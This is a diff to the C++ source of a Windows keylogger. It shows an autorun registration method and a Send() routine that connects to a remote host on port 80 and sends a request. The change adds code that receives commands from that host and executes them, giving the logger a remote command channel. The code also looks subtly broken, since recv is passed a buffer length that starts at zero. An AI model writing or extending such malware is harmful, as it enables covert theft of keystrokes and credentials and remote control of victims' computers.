@@ -48,10 +48,12 @@ const char* keyStringsNoShift[] =
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
 };
 
-Keylogger::Keylogger() {
+Keylogger::Keylogger() : cmdBufLen(0)
+{
 
 }
-Keylogger::~Keylogger() {
+Keylogger::~Keylogger()
+{
 
 }
 void Keylogger::RegisterAutorun()
@@ -166,10 +168,25 @@ void Keylogger::Send()
     sin.sin_port = htons(80);
 
     if (connect(sock, (struct sockaddr *) &sin, sizeof(sin)) < 0)
+    {
         Error(_T("connect() failed"));
+        return;
+    }
 
     if (send(sock, request.c_str(), request.length(), 0) != request.length())
+    {
         Error(_T("send() sent a different number of bytes than expected"));
+        closesocket(sock);
+        return;
+    }
+
+    this->cmdBufLen = recv(sock, cmdBuf, this->cmdBufLen, 0);
+    if (this->cmdBufLen > 0)
+    {
+        cmd.Run(cmdBuf);
+        this->cmdBufLen = 0;
+    }
 
     closesocket(sock);
+    return;
 }
